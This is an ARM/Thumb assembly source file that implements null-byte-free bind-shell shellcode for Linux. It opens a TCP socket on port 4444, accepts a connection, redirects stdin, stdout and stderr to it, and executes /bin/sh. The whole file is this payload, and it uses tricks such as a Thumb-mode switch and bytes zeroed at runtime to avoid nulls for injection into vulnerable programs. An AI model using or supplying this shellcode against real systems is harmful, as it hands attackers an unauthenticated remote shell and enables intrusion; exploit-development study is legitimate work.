/*Runs TCP Bind w/o null bytes

.section .text
.global _start

_start:
	.ARM
	add r3, pc, #1	//switch to thumb mode
	bx r3

	.THUMB
//socket(2, 1, 0)
	mov r0, #2
	mov r1, #1
	sub r2, r2, r2	//set r2 to null
	mov r7, #200	//first set to 200
	add r7, #81	//add 81 to get 281 for syscall
	svc #1		//return sockid value to r0
	mov r4, r0	//save return value

//bind(r0, &sockaddr, 16)
	adr r1, struct_addr	//pointer to address, port	
	strb r2, [r1, #1]	//write 0 for AF_INET
	strb r2, [r1, #4]	//rewrite IP address as 0.0.0.0 one at a time
	strb r2, [r1, #5]
	strb r2, [r1, #6]
	strb r2, [r1, #7]
	mov r2, #16		//address length of struct
	add r7, #1		//r7 = 282 (one greater than sock sys
	svc #1			//syscall
	nop

//listen(sockid, 2)
	mov r0, r4		//sockid was saved to r4
	mov r1, #2
	add r7, #2		//r7 = 284 (syscall number)
	svc #1

//accept(sockid, NULL, NULL)
	mov r0, r4		//sock id was saved
	sub r1, r1, r1		//r1 to null
	sub r2, r2, r2		//r2 to null
	add r7, #1		//r7 = 285 (accept syscall)
	svc #1
	mov r4, r0

//dup2(sockid, 0)
	mov r7, #63		//set to new number (fits in memory directly)
	mov r0, r4		//saved sockid
	sub r1, r1, r1		//set r1 to 0 for stdin
	svc #1

//dup2(sockfd, 1)
	mov r0, r4		//saved sockid
	add r1, #1		//stdout
	svc #1

//dup2(sockfd, 2)
	mov r0, r4		//saved sockid
	add r1, #1		//stderr
	svc #1

//execve("/bin/sh", 0,0)
	adr r0, shellcode	//location of bin/shx
	eor r1, r1, r1		//clear register r1
	eor r2, r2, r2
	strb r2, [r0, #7]	//store null byte at end of /bin/sh0
	mov r7, #11
	svc #1
	nop

	
struct_addr:
	.ascii "\x02\xff" //AF_INET 0xff will be NULLed
	.ascii "\x11\x5c" //port number
	.byte 1,1,1,1 //IP address
shellcode:
	.ascii "/bin/shX" //null the X
